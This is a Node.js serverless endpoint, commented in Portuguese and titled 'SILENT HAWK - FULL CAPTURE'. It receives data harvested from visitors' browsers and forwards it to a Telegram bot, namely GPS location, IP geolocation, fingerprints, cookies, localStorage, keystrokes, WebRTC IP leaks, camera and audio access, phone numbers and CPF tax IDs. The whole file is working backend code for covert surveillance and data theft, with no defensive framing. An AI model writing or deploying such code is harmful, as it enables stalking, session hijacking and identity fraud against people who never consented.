const axios = require('axios');

// Função para escapar caracteres Markdown para evitar erros no Telegram
function escapeMarkdown(text) {
    if (typeof text !== 'string') return text;
    return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

module.exports = async (req, res) => {
    // CORS headers para permitir requisições de qualquer origem
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    
    // Responder imediatamente a requisições OPTIONS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    try {
        console.log('📩 Request received for /api/capture', req.method);
        
        let data = {};
        if (req.method === 'POST') {
            data = req.body || {};
            console.log('POST body:', JSON.stringify(data, null, 2));
        } else if (req.method === 'GET' && req.query.data) {
            data = JSON.parse(decodeURIComponent(req.query.data));
            console.log('GET data:', JSON.stringify(data, null, 2));
        } else {
            return res.status(400).json({ error: 'Método não suportado ou dados faltando' });
        }

        // Construir mensagem para Telegram com Markdown escapado
        let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`;
        message += `📱 *User Agent:* ${escapeMarkdown(data.userAgent || 'N/A')}\n`;
        message += `💻 *Platform:* ${escapeMarkdown(data.platform || 'N/A')}\n`;
        message += `🌐 *Language:* ${escapeMarkdown(data.language || 'N/A')}\n`;
        message += `⏰ *Timestamp:* ${escapeMarkdown(data.timestamp || new Date().toLocaleString('pt-BR'))}\n`;
        message += `🖥️ *Resolution:* ${escapeMarkdown(data.screen?.width || 'N/A')}x${escapeMarkdown(data.screen?.height || 'N/A')}\n`;
        message += `🏠 *Timezone:* ${escapeMarkdown(data.timezone || 'N/A')}\n`;
        message += `🧠 *Device Memory:* ${escapeMarkdown(data.deviceMemory || 'N/A')}\n`;
        message += `⚡ *Hardware Concurrency:* ${escapeMarkdown(data.hardwareConcurrency || 'N/A')}\n`;

        // Dados de geolocalização
        if (data.geolocation) {
            message += `\n📍 *GPS LOCATION:*\n`;
            message += `• Lat: ${escapeMarkdown(data.geolocation.latitude)}\n`;
            message += `• Long: ${escapeMarkdown(data.geolocation.longitude)}\n`;
            message += `• Accuracy: ${escapeMarkdown(data.geolocation.accuracy)}m\n`;
            message += `• Altitude: ${escapeMarkdown(data.geolocation.altitude || 'N/A')}\n`;
            message += `• Speed: ${escapeMarkdown(data.geolocation.speed || 'N/A')}\n`;
            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`;
        } else if (data.geolocationError) {
            message += `\n❌ *Geolocation Error:* ${escapeMarkdown(data.geolocationError)}\n`;
        }

        // Triangulação de IP
        if (data.ipLocation) {
            message += `\n🌍 *IP TRIANGULATION:*\n`;
            message += `• IP: ${escapeMarkdown(data.ipLocation.ip || data.ipLocation.query || 'N/A')}\n`;
            message += `• City: ${escapeMarkdown(data.ipLocation.city || data.ipLocation.regionName || 'N/A')}\n`;
            message += `• Region: ${escapeMarkdown(data.ipLocation.region || data.ipLocation.region || 'N/A')}\n`;
            message += `• Country: ${escapeMarkdown(data.ipLocation.country_name || data.ipLocation.country || 'N/A')}\n`;
            message += `• ISP: ${escapeMarkdown(data.ipLocation.org || data.ipLocation.isp || 'N/A')}\n`;
            message += `• ASN: ${escapeMarkdown(data.ipLocation.asn || 'N/A')}\n`;
            
            // Detecção de VPN com base no fuso horário
            const ipTimeZone = data.ipLocation.timezone || data.ipLocation.time_zone || null;
            const browserTimeZone = data.timezone;
            if (ipTimeZone && browserTimeZone) {
                if (ipTimeZone !== browserTimeZone) {
                    message += `⚠️ *VPN DETECTED!* Time Zone Mismatch: IP Time Zone: ${escapeMarkdown(ipTimeZone)}, Browser Time Zone: ${escapeMarkdown(browserTimeZone)}\n`;
                } else {
                    message += `✅ *Time Zone Match:* ${escapeMarkdown(browserTimeZone)} (No VPN detected)\n`;
                }
            }
        } else if (data.ipError) {
            message += `\n❌ *IP Error:* ${escapeMarkdown(data.ipError)}\n`;
        }

        // Dados de fingerprinting
        if (data.canvasFingerprint) {
            message += `\n🎨 *Canvas Fingerprint:* Collected\n`;
        }
        if (data.webglVendor) {
            message += `• *WebGL Vendor:* ${escapeMarkdown(data.webglVendor)}\n`;
        }
        if (data.webglRenderer) {
            message += `• *WebGL Renderer:* ${escapeMarkdown(data.webglRenderer)}\n`;
        }
        if (data.fonts && data.fonts.length > 0) {
            message += `• *Fonts:* ${escapeMarkdown(data.fonts.join(', '))}\n`;
        }
        if (data.plugins && data.plugins.length > 0) {
            message += `• *Plugins:* ${escapeMarkdown(data.plugins.join(', '))}\n`;
        }

        // Acesso à câmera e áudio
        if (data.cameraCapture) {
            message += `\n📷 *Camera Access:* GRANTED\n`;
        } else if (data.cameraError) {
            message += `\n❌ *Camera Error:* ${escapeMarkdown(data.cameraError)}\n`;
        }
        if (data.audioCapture) {
            message += `🎤 *Audio Access:* GRANTED\n`;
        }

        // Informações de rede
        if (data.connection) {
            message += `\n📡 *Network Info:*\n`;
            message += `• Type: ${escapeMarkdown(data.connection.type || 'N/A')}\n`;
            message += `• Effective Type: ${escapeMarkdown(data.connection.effectiveType || 'N/A')}\n`;
            message += `• Downlink: ${escapeMarkdown(data.connection.downlink || 'N/A')} Mbps\n`;
            message += `• RTT: ${escapeMarkdown(data.connection.rtt || 'N/A')} ms\n`;
        }

        // Cookies e localStorage
        if (data.cookies) {
            message += `\n🍪 *Cookies:* ${escapeMarkdown(data.cookies.length > 100 ? data.cookies.substring(0, 100) + '...' : data.cookies)}\n`;
        }
        if (data.localStorage) {
            message += `💾 *Local Storage:* ${escapeMarkdown(data.localStorage.length > 100 ? data.localStorage.substring(0, 100) + '...' : data.localStorage)}\n`;
        }

        // Keylogging
        if (data.keystrokes) {
            message += `\n⌨️ *Keystrokes Captured:* ${escapeMarkdown(data.keystrokes)}\n`;
        }

        // WebRTC Leak
        if (data.webrtcIP) {
            message += `🌐 *WebRTC IP Leak:* ${escapeMarkdown(data.webrtcIP)}\n`;
        }

        // Dados de engenharia social
        if (data.phone) {
            message += `📱 *Phone Number:* ${escapeMarkdown(data.phone)}\n`;
        }
        if (data.cpf) {
            message += `🔢 *CPF:* ${escapeMarkdown(data.cpf)}\n`;
        }

        // Enviar para Telegram
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            throw new Error('Variáveis de ambiente TELEGRAM_BOT_TOKEN ou TELEGRAM_CHAT_ID não configuradas');
        }

        console.log('Enviando para Telegram...');
        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });

        console.log('Mensagem enviada com sucesso para Telegram');
        res.status(200).json({ success: true, message: 'Dados enviados' });
    } catch (error) {
        console.error('❌ Erro em capture.js:', error.message);
        res.status(500).json({ error: error.message });
    }
};
